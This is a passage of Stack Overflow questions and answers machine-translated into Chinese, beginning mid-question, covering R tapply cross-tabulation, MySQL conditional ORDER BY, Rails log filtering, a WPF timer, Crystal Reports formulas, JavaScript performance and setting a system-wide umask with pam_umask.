mtcars$am <- factor(mtcars$am, labels=c("manual","auto")
str(mtcars)
tapply(mtcars$mpg, mtcars$gear, sum) 
```

这给了我每个齿轮的总 mpg。但是假设我想要一个 3x3 的桌子，上面有齿轮，侧面有圆柱体，还有 9 个带有双变量和的单元格，我怎么能“聪明地”得到它。

我可以去。

```
tapply(mtcars$mpg[mtcars$cyl=="four"], mtcars$gear[mtcars$cyl=="four"], sum)
tapply(mtcars$mpg[mtcars$cyl=="six"], mtcars$gear[mtcars$cyl=="six"], sum)
tapply(mtcars$mpg[mtcars$cyl=="eight"], mtcars$gear[mtcars$cyl=="eight"], sum) 
```

这似乎很麻烦。

那么我将如何在混合中引入第三个变量？

这有点在我正在考虑的空间中。 [使用 ddply 汇总统计信息](https://stackoverflow.com/questions/5714658/summary-statistics-using-ddply)

**更新**这让我到了那里，但它并不漂亮。

```
aggregate(mpg ~ am+cyl+gear, mtcars,sum) 
```

干杯

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2012-04-19T01:48:07.463

这个怎么样，还在用`tapply()`？它比你知道的更通用！

```
with(mtcars, tapply(mpg, list(cyl, gear), sum))
#       three  four five
# four   21.5 215.4 56.4
# six    39.5  79.0 19.7
# eight 180.6    NA 30.8 
```

或者，如果您希望打印的输出更易于解释：

```
with(mtcars, tapply(mpg, list("Cylinder#"=cyl, "Gear#"=gear), sum)) 
```

* * *

如果你想使用两个以上的交叉分类变量，想法是完全一样的。然后，结果将在一个 3 维或更多维数组中返回：

```
A <- with(mtcars, tapply(mpg, list(cyl, gear, carb), sum))

dim(A)
# [1] 3 3 6
lapply(1:6, function(i) A[,,i]) # To convert results to a list of matrices

# But eventually, the curse of dimensionality will begin to kick in...
table(is.na(A))
# FALSE  TRUE 
#    12    42 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2016-02-04T23:10:56.273

我认为这个问题的答案已经是很棒的选择，但我想分享一个基于`dplyr`包的附加选项（这对我来说是因为我现在正在教一门我们`dplyr`用于数据操作的课程，所以我想避免向学生介绍专门的基本 R 函数，如`tapply`or `aggregate`)。

您可以使用该`group_by`函数对任意数量的变量进行分组，然后使用 汇总来自这些组的信息`summarize`。我认为对于 R 新手来说，这段代码比基于公式的接口更具可读性`aggregate`，产生相同的结果：

```
library(dplyr)
mtcars %>%
  group_by(am, cyl, gear) %>%
  summarize(mpg=sum(mpg))
#       am   cyl  gear   mpg
#    (dbl) (dbl) (dbl) (dbl)
# 1      0     4     3  21.5
# 2      0     4     4  47.2
# 3      0     6     3  39.5
# 4      0     6     4  37.0
# 5      0     8     3 180.6
# 6      1     4     4 168.2
# 7      1     4     5  56.4
# 8      1     6     4  42.0
# 9      1     6     5  19.7
# 10     1     8     5  30.8 
```

`spread`使用两个变量，您可以通过从包中添加对函数的调用，在行上使用一个变量，在列上使用另一个变量进行汇总`tidyr`：

```
library(dplyr)
library(tidyr)
mtcars %>%
  group_by(cyl, gear) %>%
  summarize(mpg=sum(mpg)) %>%
  spread(gear, mpg)
#     cyl     3     4     5
#   (dbl) (dbl) (dbl) (dbl)
# 1     4  21.5 215.4  56.4
# 2     6  39.5  79.0  19.7
# 3     8 180.6    NA  30.8 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-19T01:53:31.983

我喜欢 Josh 对此的回答，但`reshape2`也可以为这些类型的问题提供一个很好的框架：

```
library(reshape2)

#use subset to only grab the variables of interest...
mtcars.m <- melt(subset(mtcars, select = c("mpg", "gear", "cyl")), measure.vars="mpg")
#cast into appropriate format
dcast(mtcars.m, cyl ~ gear, fun.aggregate=sum, value.var="value")

   cyl three  four five
1  four  21.5 215.4 56.4
2   six  39.5  79.0 19.7
3 eight 180.6   0.0 30.8 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2018-02-18T05:29:36.020

答案包含使用 tapply 和聚合函数的相同输出。

我想在 Josh O'Brien 的回答中添加一些信息。用户可以根据输出使用聚合函数或点击。为了在 tapply 中使用多个因子变量，可以使用 Josh 展示的方法。

加载数据集

```
data("mtcars") 
```

使用轻拍

```
with(mtcars, tapply(mpg, list("Cylinder#"=cyl, "Gear#"=gear), sum)) 
```

上面代码的输出是

```
 Gear#
Cylinder#     3     4    5
    4     21.5 215.4 56.4
    6     39.5  79.0 19.7
    8    180.6    NA 30.8 
```

使用聚合函数

```
with(mtcars, aggregate(mpg, list(Cylinder = cyl, Gear =  gear), sum)) 
```

聚合函数的输出

```
 Cylinder Gear  x
1        4    3  21.5
2        6    3  39.5
3        8    3 180.6
4        4    4 215.4
5        6    4  79.0
6        4    5  56.4
7        6    5  19.7
8        8    5  30.8 
```

现在，如果用户想要与聚合函数相同的输出但使用 tapply。

```
as.data.frame(as.table(with(mtcars, tapply(mpg, list("Cylinder#"=cyl, "Gear#"=gear),
sum)))) 
```

tapply 函数的输出

```
 Cylinder. Gear.  Freq
1         4     3  21.5
2         6     3  39.5
3         8     3 180.6
4         4     4 215.4
5         6     4  79.0
6         8     4    NA
7         4     5  56.4
8         6     5  19.7
9         8     5  30.8 
```

可以根据业务需求保留或删除 NA。

# php - MySQL：如何对 ORDER 使用 IF 条件

> ID：10220511
> 
> 赞同：3
> 
> 时间：2012-04-19T01:39:07.793
> 
> 标签：php, mysql, sql

> **可能重复：**
> [您可以在 PHP MYSQL ORDER BY 中添加“IF”语句吗？](https://stackoverflow.com/questions/3550942/can-you-add-if-statement-in-php-mysql-order-by)

如何在 MySQL 中对 ORDER 使用 IF 条件？

例如，我下面的查询返回一个错误，

```
SELECT *
FROM page AS p

WHERE p.parent_id != p.page_id
AND p.type = 'post'
AND p.parent_id = '7'

IF(
    'date created' = 'date created', 
    ORDER BY p.created_on DESC,
    ORDER BY p.created_on ASC
) 
```

信息，

> 1064 - 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 17 行的 'IF('date created' = 'date created', ORDER BY p.created_on DESC, ORDER BY p.' 附近使用正确的语法

第一个“**创建日期**”是可变的。所以如果`'date created' = 'date created'`，

然后`ORDER BY p.created_on DESC`

别的`ORDER BY p.created_on ASC`

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-19T01:56:35.957

用这个：

```
create table person
(
  name varchar(50)
);

insert into person(name)
select 'John' union
select 'Paul' union
select 'George' union
select 'Ringo' ;

set @direction = 1;

-- the '' is ignored on sorting since they are all the same values
select * from person
order by 
    IF (@direction = 0, name,'') ASC,
    IF (@direction = 1, name,'') DESC 
```

现场测试：[http ://www.sqlfiddle.com/#!2/22ea1/1](http://www.sqlfiddle.com/#!2/22ea1/1)

另一种方法是使用 -1 表示下降方向，使用 +1 表示上升方向，然后将其乘以字段，仅适用于数字字段：

```
create table person
(
  name varchar(50), birth_year int
  );

insert into person(name, birth_year)
select 'John', 1940 union
select 'Paul', 1941 union
select 'George', 1943 union
select 'Ringo', 1940 ;

set @direction = -1;  -- -1: descending, 1: ascending

select * from person
order by birth_year * @direction 
```

现场测试：[http ://www.sqlfiddle.com/#!2/f78f3/3](http://www.sqlfiddle.com/#!2/f78f3/3)

# java - 为什么我的 Android 项目要寻找“主要”功能？

> ID：10220513
> 
> 赞同：1
> 
> 时间：2012-04-19T01:39:13.850
> 
> 标签：java, android, eclipse

我使用 File->New->Android Project 在 Eclipse 中创建了一个 Android 项目。我创建了一个相同 API 版本 10 (2.3.3) 的 Android 虚拟设备。我在包 foo.foo.foo 中创建了一个活动 Asdf

Android项目不应该有一个main函数，那么Java为什么要找一个呢？

```
package foo.foo.foo;

import android.app.Activity;
import android.os.Bundle;

public class Asdf extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
    }
} 
```

> 线程“主”java.lang.NoClassDefFoundError 中的异常：原因：java.lang.ClassNotFoundException：在 java.net.URLClassLoader$1.run(URLClassLoader.java:202) 在 java.security.AccessController.doPrivileged(Native Method) 在java.net.URLClassLoader.findClass(URLClassLoader.java:190) 在 java.lang.ClassLoader.loadClass(ClassLoader.java:307) 在 sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301) 在 java.lang .ClassLoader.loadClass(ClassLoader.java:248) 找不到主类：。程序将会退出。

编辑：活动在清单中声明，它也是由 eclipse 自动生成的：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
      package="foo.foo.foo"
      android:versionCode="1"
      android:versionName="1.0">
    <uses-sdk android:minSdkVersion="10" />

    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:name=".Asdf"
                  android:label="@string/app_name">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

    </application>
</manifest> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:40:59.490

“main”是应用创建时默认创建的布局文件。您可能已经从布局文件夹中删除了该布局，或者可能在布局文件夹中更改了它的名称。如果您设计了任何布局，请在此处参考。而 main 不是complusary。

您是否还在清单文件中声明了您的活动？

设置内容视图（R.layout.main）；意味着它正在寻找布局文件而不是功能

# ruby-on-rails - 加密或清理 Rails 日志文件

> ID：10220516
> 
> 赞同：11
> 
> 时间：2012-04-19T01:39:25.467
> 
> 标签：ruby-on-rails, security, logging

我们有一个客户的安全要求非常严格。因此，我们将使用 Postgres 的数据库加密选项之一来加密 Rails 数据库。但这仍然会使客户的数据在提交表单以创建数据时暴露在 Rails 记录器记录的内容中。

我想一种选择不是加密日志文件，而是抑制 Rails 为 POST 请求记录的所有参数值。最好的方法是什么？

另一种选择是在写入磁盘时加密 Rails 日志文件。这是一个更好的方法吗？有什么好的方法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2015-10-17T00:01:51.593

您可以做的一件事是在您的**config/application.rb**文件中，您可以像这样添加要从日志中省略的字段

```
class Application < Rails::Application
  ...
  config.filter_parameters += [:password]
  config.filter_parameters += [:ssn]    
  ....
 end 
```

我希望这个对你有用

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-10-22T22:35:42.103

如果你想要比所有参数的 filter_parameters 更好的东西，你可以编写一个自定义记录器。请参阅：[http](http://rubyjunky.com/cleaning-up-rails-4-production-logging.html) ://rubyjunky.com/cleaning-up-rails-4-production-logging.html以及有人从中提取的 gem，[https://github.com/gshaw/concise_logging](https://github.com/gshaw/concise_logging)

但是，您需要将加密密钥与日志存储在同一台机器上的某个位置，这可能意味着如果有人具有主动访问权限（但如果他们稍后以某种方式获取日志则不会）。

一些需要思考的问题：

*   您是否需要参数记录？（你甚至检查日志吗？你如何跟踪错误？）
*   你想达到什么样的合规性？PCI？HIPAA？
*   您要避免的攻击媒介是什么？即通过共享主机访问日志、物理攻击（移除硬盘驱动器）、远程访问（从机器上获取所有文件）、..

你的答案将定义如何解决这个问题的指导方针！

# javascript - 不计算输入和文本区域的数量与数据

> ID：10220517
> 
> 赞同：0
> 
> 时间：2012-04-19T01:39:30.583
> 
> 标签：javascript, jquery, forms, count, keyup

有人可以告诉我这个脚本做错了什么。我试图让脚本首先工作，其次，我需要数数。

该脚本在演示中工作：http: [//jsbin.com/ayalav/3/edit#javascript,html,live](http://jsbin.com/ayalav/3/edit#javascript,html,live)

但我无法让它在我的网页上工作： [http ://www.41q.org/admin/data/test.php](http://www.41q.org/admin/data/test.php)

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:42:58.553

只需将您的 JavaScript 包装为：

```
$(document).ready(function() {

// your JavaScript goes here

}); 
```

# arrays - Crystal Report：如何在一个公式中评估多个 IF 语句？

> ID：10220519
> 
> 赞同：8
> 
> 时间：2012-04-19T01:40:04.390
> 
> 标签：arrays, if-statement, crystal-reports, formula, crystal-reports-2008

## 背景

*   我正在尝试对报告的详细信息行进行一些漂亮的验证。
*   我有几个名为 Assert 语句的公式，如果它们未通过测试，则返回 false，如果通过则返回 true。

## 目标

*   我想创建一个存储“违反规则”的数组，然后将它们显示在行尾的一个字段中，在名为“Broken Rules”的标题下

## 到目前为止我所做的

*   在报表标题中创建了一个数组并将其初始化为一个空字符串数组
*   创建了一个公式来评估每个规则，增加数组，并添加损坏的规则编号（这是每个规则的重复代码，没什么花哨的）。这将添加到我的详细信息显示上方的隐藏详细信息部分。
*   创建了一个公式，它是规则损坏数组中元素的连接。这是与我的详细信息字段一起显示的公式。
*   创建了一个公式以将规则损坏的数组设置为空。在我的详细信息显示之后，这将进入隐藏的详细信息部分。

## 问题

*   Crystal 似乎不允许使用我能找到的“end if”语句。
*   因此，看来我只能评估一个 If 语句，而不是单个公式中的倍数。
*   这意味着我不能做多个 if，每个规则一个。

## 示例代码

创建数组（名为 Init_StringVar_Array_RulesBroken 的公式）：

```
//@Init
//This goes into the report header
WhilePrintingRecords;

//initializes the array of broken rules which we'll add to during details
StringVar Array RulesBroken;
""; 
```

递增数组和添加值的前三个规则评估示例（在名为 Increment_StringVar_Array_RulesBroken 的公式中）：

```
//@Increment
//Goes before the details section is displayed

//accesses the shared variable
WhilePrintingRecords;
StringVar Array RulesBroken;

//separate if statement for each assert statement

//01
if not {@Assert_01_IfCrewIsConstructionCrew_CBFlagShouldBeYesOrDirect} then
Redim Preserve RulesBroken[UBound(RulesBroken) + 1]; //extends the array to be able to hold one more item than it does currently
RulesBroken[UBound(RulesBroken)] := "01"; //adds the new string into the array

//02
if not {@Assert_02_IfCrewIsConstructionCrew_AndCBFlagIsDirect_WONumberShouldStartWithC} then
Redim Preserve RulesBroken[UBound(RulesBroken) + 1]; //extends the array to be able to hold one more item than it does currently
RulesBroken[UBound(RulesBroken)] := "02"; //adds the new string into the array

//03
if not {@Assert_03_IfCrewIsDesign_AndCBFlagIsDirect_WONumberShouldStartWithD} then
Redim Preserve RulesBroken[UBound(RulesBroken) + 1]; //extends the array to be able to hold one more item than it does currently
RulesBroken[UBound(RulesBroken)] := "03"; //adds the new string into the array 
```

## 有任何想法吗？

*   Crystal Reports 中是否有 If / then / end if 功能？
*   如果没有，Crystal Reports 中是否有针对此类事情的解决方法？我是否需要为每个公式创建多个公式并确保它们被放置在另一个或类似的东西之后？

提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-04-19T01:54:52.423

使用您拥有的代码执行此操作的最简单方法是将 if 块包装在括号中并用分号分隔它们：

```
//01
(
    if not {@Assert_01_IfCrewIsConstructionCrew_CBFlagShouldBeYesOrDirect} then
        Redim Preserve RulesBroken[UBound(RulesBroken) + 1];
        RulesBroken[UBound(RulesBroken)] := "01"
    else ""
);

//02
(
    if not {@Assert_02_IfCrewIsConstructionCrew_AndCBFlagIsDirect_WONumberShouldStartWithC} then
        Redim Preserve RulesBroken[UBound(RulesBroken) + 1];
        RulesBroken[UBound(RulesBroken)] := "02"
    else ""
);

//03
(
    if not {@Assert_03_IfCrewIsDesign_AndCBFlagIsDirect_WONumberShouldStartWithD} then
        Redim Preserve RulesBroken[UBound(RulesBroken) + 1];
        RulesBroken[UBound(RulesBroken)] := "03"
    else ""
); 
```

我添加了指示 Crystal 如何解释块的缩进。

# c# - 在标签中显示部分程序的运行时间

> ID：10220528
> 
> 赞同：2
> 
> 时间：2012-04-19T01:41:32.910
> 
> 标签：c#, wpf

我试图让标签显示用户完成从 00:00:00 开始并从那里开始以毫秒为增量上升的任务所花费的时间。到目前为止，我有这个：

```
 private void startTimer()
    {
        stopWatch.Start();
        Dispatcher.BeginInvoke(DispatcherPriority.Render, new ThreadStart(ShowElapsedTime));
    }
    void ShowElapsedTime()
    {
        TimeSpan ts = stopWatch.Elapsed;
        lblTime.Text = String.Format("{0:00}:{1:00}.{2:00}", ts.Minutes, ts.Seconds, ts.Milliseconds / 10);
    } 
```

`startTimer();`在单击按钮时调用

有人可以指出我正确的方向吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-04-19T02:20:02.503

我建议采用 MVVM 方法。让您的 TextBlock 绑定到 ViewModel 上的字符串成员。在您的 ViewModel 中，您可以使用 DispatcherTimer 设置经过的时间。DispatcherTimer 在 UI 线程上触发其回调，因此您无需调用 UI 线程。

代码：

```
public class ViewModel : INotifyPropertyChanged
{
     public event PropertyChangedEventHandler PropertyChanged;
     public string TimeElapsed {get;set;}

     private DispatcherTimer timer;
     private Stopwatch stopWatch;

     public void StartTimer()
     {
          timer = new DispatcherTimer();
          timer.Tick += dispatcherTimerTick_;
          timer.Interval = new TimeSpan(0,0,0,0,1);
          stopWatch = new Stopwatch();
          stopWatch.Start();
          timer.Start();
     }

     private void dispatcherTimerTick_(object sender, EventArgs e)
     {
         TimeElapsed = stopWatch.Elapsed.TotalMilliseconds; // Format as you wish
         PropertyChanged(this, new PropertyChangedEventArgs("TimeElapsed")); 
     }
} 
```

XAML：

```
<TextBlock Text="{Binding TimeElapsed}"/> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T02:07:44.787

简单的方法是使用计时器（不是秒表）。计时器是一个组件，您可以设置间隔并在每个刻度上调用一个方法。例如，结合秒表的数据成员，您可以每 50 毫秒访问一次秒表的 Elapsed 属性（就像您在 ShowElapsedTime 方法中所做的那样）。

这样做的主要问题是计时器的计时不完美，并且在标签文本更新时也会出现颠簸。

另一种方法是使用线程来防止 UI 锁定，但是如果您从主线程以外的线程更改标签文本 - 您会遇到异常。

您可以绕过该异常，但更好的方法是使用 BackgroundWorker。

BGWorker 将在不同的线程中执行任务，您可以让它报告进度，以便在主线程中调用。

如果您真的想做到完美，请拥有一个实现 INotifyPropertyChanged 的​​类，该类具有属性 ElapsedTime 和私有 StopWatch 数据成员。该类将以下列方式使用 BackgroundWorker。

在ctor：

```
this._stopwatch = new Stopwatch();
this._worker = new BackgroundWorker {WorkerReportsProgress = true, WorkerSupportsCancellation = true};

_worker.DoWork += (s, e) =>
                     {
                         while (!_worker.CancellationPending)
                         {
                             _worker.ReportProgress(0, watch.Elapsed);
                             Thread.Sleep(1);
                         }
                     };

_worker.ProgressChanged += (s, e) =>
                              {
                                  this.ElapsedTime = (TimeSpan)e.UserState;
                              }; 
```

当您想启动工作人员（也就是启动计时器）时：

```
stopwatch.Start();
_worker.RunWorkerAsync(); 
```

当您想停止工作人员（也就是停止计时器）时：

```
stopwatch.Reset();
_worker.CancelAsync(); 
```

该类本身将具有与工作人员（数据成员）交互的 Start 和 Stop 方法。

最后，您可以将标签文本绑定到类的 ElapsedTime 属性。或者使用您的 ShowElapsedTime 方法订阅 ElapsedTimeChanged 事件，除非它将使用您的类的 ElapsedTime 属性而不是 stopWatch.Elapsed 属性。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T02:06:35.953

您需要一个会`ShowElapsedTime`定期调用的计时器。有关示例，请参阅[WPF 计时器倒计时。](https://stackoverflow.com/questions/10001698/wpf-timer-countdown)

# c# - 强制执行方法

> ID：10220529
> 
> 赞同：1
> 
> 时间：2012-04-19T01:41:38.803
> 
> 标签：c#, .net, algorithm

我正在写一个购物车模拟应用程序

这是我的情况，我想强制一个类型执行它为自己定义的方法......

基本上我有一个界面

```
interface IGroceryCart
{
   // Other methods snipped for clarity
   void Checkout(IEnumerable<IGroceryItem> itemsToBuy);
} 
```

现在 IGroceryItem 界面看起来像这样

```
interface IGroceryItem
{
   // Other methods snipped for clarity
   CheckoutIssues EnsureFreshness();
} 
```

IgroceryCart 和 IgroceryItem 显然有具体的实现，但我想要做的是：

当我在购物车上调用 Checkout 时，我希望所有被检出的物品都在内部调用它们的 EnsureFreshness() 方法，然后在一个或多个物品有 CheckoutIssues 时做出相应的反应

CheckoutIssues 就像

```
class CheckoutIssues
{
   string Description {get;set;}
   //etc
} 
```

实现在每个杂货项目上调用 EnsureFreshness 的方式的最佳方法是什么？还是更好地解决此类错误的替代方法？我应该走自定义验证器路线吗？每个杂货项目可能有自己的检查新鲜度的方式，例如牛奶与鸡蛋不同，所以我必须依赖每个单独的实现，但我想强制在结账时调用，希望这是有道理的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T01:49:27.073

你可以把它放在你的 Checkout 方法中，然后将返回的对象添加到某个集合中来处理：

```
List<CheckoutIssues> issues = new List<CheckoutIssues>();
foreach (IGroceryItem item in itemsToBuy) {
    issues.Add(item.EnsureFreshness());
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T02:02:11.747

好吧，假设您去沃尔玛并添加物品`Cart`，是`Cart`结账的责任还是柜台雇主的责任？

我觉得`Checkout`在 Shopping上有方法是有道理的`Cart`。如果我是你，我可能会走这条路。

```
 interface IGroceryCart
{

   /**void Checkout(IEnumerable<IGroceryItem> itemsToBuy);**/
   void AddItem(IEnumerable<IGroceryItem> itemsToBuy)//I like to add items to Grocery Cart.
} 
```

我应该能够将 Item 添加到 GroceryCart。

第二个问题是当你`Apples`在沃尔玛加入购物车时，苹果不知道它是新鲜的、过期的还是腐烂的。

```
 interface IGroceryItem
    { 
       CheckoutIssues EnsureFreshness(); //I am skeptic about having this method on GroceryItem
    }   

    class GroceryCart:IGroceryCart
    {
       public void AddItem(IEnumerable<IGroceryItem> itemsToBuy)
       {

       }
    }

    class Billing
   {

    public decimal BillItems(GroceryCart cart)
    {
         foreach item in cart
           if(itemIsfresh)
             Bill it.
    } 

     private bool IsItemFresh(GroceryItem item)
     {

     }

  } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T01:52:53.107

你所拥有的有什么问题？为什么不遍历您的 itemsToBuy 并在每个项目上调用 EnsureFreshness？如果返回任何错误，Checkout 可能会抛出异常，或者可以将其更改为返回错误列表，或者仅返回第一个错误。

这有帮助吗？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T03:30:19.847

什么没有这样的东西：

```
public abstract GroceryCart : IGroceryCart
{
    public void Checkout(IEnumerable<IGroceryItem> itemsToBuy)
    {
        foreach (var item in itemsToBuy)
        {
            item.EnsureFreshness();
        }

        this.InternalCheckout(itemsToBuy);
    }

    protected abstract void InternalCheckout(IEnumerable<IGroceryItem> itemsToBuy);
} 
```

现在只需从您的抽象类继承而不是实现接口。并且在您的第三方类中有一个参考，`GroceryCart`而不是`IGroceryCart`当您需要检查新鲜度时。如果不是强制性的，请继续使用`IGroceryCart`.

# javascript - 推动 JavaScript 性能的限制是什么？

> ID：10220530
> 
> 赞同：3
> 
> 时间：2012-04-19T01:41:52.677
> 
> 标签：javascript, performance

在过去的几个月里，我一直在构建一个原型页面，它使用了大量的 SVG，并且总体上有很多元素。在 JavaScript 和服务器端（大量 AJAX）中还处理了大量数据。页面上有数千个事件监听器。很重，这才是重点。

在 JS 中做这样的事情的最大障碍之一是单线程，当我必须执行 10 秒的计算时，它会锁定页面。有一些策略可以解决这个问题，但在 IE 支持 Web Workers 之前，并没有什么优雅的解决方案。此外，该页面可以使用超过 500MB 的内存，Chrome 似乎有时会遇到这种情况。

我想知道的是在 JavaScript 中构建这样的东西的可行性。我的代码远未优化，但让我们假设这个页面现在处理的负载是它所需要的——或者假设它需要更多。

我们还假设用户需要至少有一个中档桌面才能使用该应用程序。

人们是否如此努力地推动 JavaScript？就内存和 CPU 性能而言，它可以处理的内容有哪些限制？客户端与服务器端应该做多少？

编辑：我想每个人都会误解这个问题是不可避免的。我不是在寻求关于*如何优化 JS 代码*的建议。我在问*在客户端处理多少处理和数据是合理的*。是的，这取决于硬件，我试图通过*使用最新浏览器的中档台式机来回答，*但实际上这不是重点。我想从概念上*了解 JavaScript 在执行繁重的处理方面有多强大*。在 JavaScript 中进行繁重的处理是否可行？

我希望每个人现在都能得到它。这是服务器端与客户端的比率。如果我必须运行一个具有 1000000 次迭代的循环，并且假设在 JS 中进行 X 迭代和在服务器上进行 Y 迭代之间进行选择没有成本，*那么期望 JavaScript 处理多少是合理的？*

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T02:53:33.573

1) 当然，您的数千个事件监听器可以通过**事件冒泡**来合并。对于不同的事件目标，使用具有不同子例程的单个主事件处理程序将比许多特定处理程序具有更高的性能。

2) “在 IE 支持 Web Workers 之前，没有什么优雅的解决方案。”

Au contraire，mon frère：冻结浏览器可以通过**以较小的块进行处理**（如果可能的话，我会尝试将每个回调保持在 100 毫秒以下）并在超时后执行下一步，这给出了浏览器有机会更新其状态并处理用户输入。

3) 如果您有大量元素，听起来**HTML5 Canvas**元素是比 SVG 更合适的解决方案。

4）“我的代码远未优化”

当您像这样突破极限时，算法优化会产生重大影响。

5) DOM 访问非常昂贵，因此可以通过巧妙地**减少 DOM 操作的数量**来获得巨大的收益。确保你没有接触每个元素，一次一个。最好在一次 DOM 操作中重建整个混乱并将其全部替换。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:32:39.323

没有一成不变的限制。

在我的电脑上和我查找食谱的机器上和我 4 岁的上网本上可以做的事情会有所不同。内存、速度等取决于浏览器、cpu、ram 以及机器上运行的其他内容。我敢打赌，你在其他一些平台上运行你的代码，它会冻结，你必须做三指敬礼才能终止进程。

*   进行智能事件处理，检测较低级别的点击，而不是每个元素。
*   在服务器上尽可能多地推送以进行密集处理。
*   优化代码，确保您不会在循环的每次迭代中更新屏幕。
*   尽可能合并/最小化 http 请求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T01:56:17.813

用户使用的系统是您可以面对但实际上无能为力的障碍。对于仍然在 512MB RAM 上运行 Pentium 的用户，以及雪上加霜的 IE6，webapps 会变得很糟糕。另一个问题是浏览器本身。DOM 很慢。您应该尽可能避免接触 DOM。

你可以做的是改进你的代码，找到占用内存或进行过多处理的地方并将它们分解。例如，当前可以通过使用超时和回调来补救单线程。这是我处理一个很长的循环[的演示之一。](http://jsfiddle.net/nBFbD/)一个执行同步操作，另一个使用超时来模拟异步操作。

您还可以将数据和处理卸载到服务器，使您的客户端应用程序成为“瘦客户端”。尽管 HTTP 请求可能会杀死您，但您在应用程序中执行其他操作时将服务器视为“第二个线程”。比如游戏。您可以计算分数、排名、比赛和服务器上的所有内容。不要让客户端这样做。只需让客户端成为服务器中正在发生的所有事情的“显示器”。

# linux - 如何设置系统范围的umask？

> ID：10220531
> 
> 赞同：68
> 
> 时间：2012-04-19T01:41:54.627
> 
> 标签：linux, system, umask

我在一个运行 Linux（Debian 和 Ubuntu）的实验室工作。用户名和组名由 NIS 和 yp 处理。我们有一些共同的用户，每个人都可以访问来运行实验，然后我们每个人都有自己的用户，此外还有一个共同的组，我们都是其中的一员。

我怎样才能使共享`/home/`驱动器（NFS）上的所有文件和目录都被用户/组读/写（/可执行）？基本上我想要的是

```
chmod -R 664 /home
chgrp -R commongroup /home 
```

或等效地`umask 0002`。

但是运行上述命令只能修复文件夹中的当前文件，而 umask 仅适用于单个用户，并且每次用户登录时都必须运行，即。在`.bashrc`文件中（这是否适用于通过 gnome 更改模式？）。是否有系统范围的命令或设置可用于确保我们的公共组对公共文件具有写入权限？

* * *

## 回答 #1

> 赞同：99
> 
> 时间：2012-04-19T04:06:26.573

Debian 和 Ubuntu 都附带[pam_umask](http://manpages.debian.net/cgi-bin/man.cgi?query=pam_umask&sektion=8)。这允许您配置 umask`/etc/login.defs`并让它们在系统范围内应用，而不管用户如何登录。

要启用它，您可能需要在`/etc/pam.d/common-session`阅读中添加一行

```
session optional pam_umask.so 
```

或者它可能已经启用。然后编辑`/etc/login.defs`并将`UMASK`行更改为

```
UMASK           002 
```

（默认为`022`）。

请注意，用户仍然可以在他们自己的或类似的文件中覆盖 umask `~/.profile`，`~/.bashrc`但是（至少在新的 Debian 和 Ubuntu 安装上）不应该在`/etc/profile`或`/etc/bash.bashrc`. （如果有，只需删除它们。）

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2015-03-18T11:00:56.820

首先，确保`pam-modules`安装包。这使得`pam_umask`模块可用。然后确保`/etc/pam.d/common-session`有一行表格

```
session optional pam_umask.so 
```

这样`pam_umask`就启用了。

现在，根据`pam_umask`手册页，默认 umask 是在登录时通过依次检查以下每个位置来确定的：

1.  一个硬系统范围的默认设置在`/etc/pam.d/common-session`. 要以这种方式进行设置，请将上述文件中的行替换为：

    ```
    session optional pam_umask.so umask=002 
    ```

2.  单个用户的 GECOS 字段中的条目`/etc/passwd`会覆盖该特定用户的软系统范围默认值。使用以下形式的命令创建该条目：

    ```
    chfn --other='umask=002' username 
    ```

3.  表格`UMASK=002`中的一行`/etc/default/login`（您可能需要创建该文件）设置了一个软系统范围的默认值。

4.  的`UMASK`值来自`/etc/login.defs`。该值也用于其他用途（计算正在创建的新用户的主目录的权限；`/etc/login.defs`有关更多详细信息，请参阅注释）。因此，最好避免依赖此设置常规登录的默认 umask，以保持独立。

因此，在您的情况下，`/etc/default/login`如果您希望可以覆盖单个用户的设置，则应该配置它，或者`/etc/pam.d/common-session`如果您希望它对所有用户都相同，则应按上述方式进行设置。

请注意，即使使用硬默认设置，用户仍然可以通过在 shell 提示符或脚本中`umask`使用命令手动覆盖默认设置。`umask``.profile`

另请注意，设置此默认值的传统 Unix 方法是向 中添加`umask`命令`/etc/profile`，这仍然有效。但这不是在 Ubuntu 上配置此类内容的推荐方式，因为使用脚本和 GUI 很难可靠地进行管理。

请注意，不幸[的是，对于任何已转换为通过`systemd --user`](https://github.com/systemd/systemd/issues/6077).

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-03T20:16:51.857

为了匹配组权限，在服务器上，可以将设置的 gid 位（“粘性位”之一）视为附加选项。

如果共享目录链接到*组*，启动（使用 root）： **chmod -R 2775 *folder_for_the_group*** 可能会很有趣。

对于在文件夹中创建的任何新文件，创建者将是所有者，但将自动指定组（只要创建者是组的一部分）。

权利的网格现在显示为 -rwxrwsr-x+

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2022-01-28T19:50:38.303

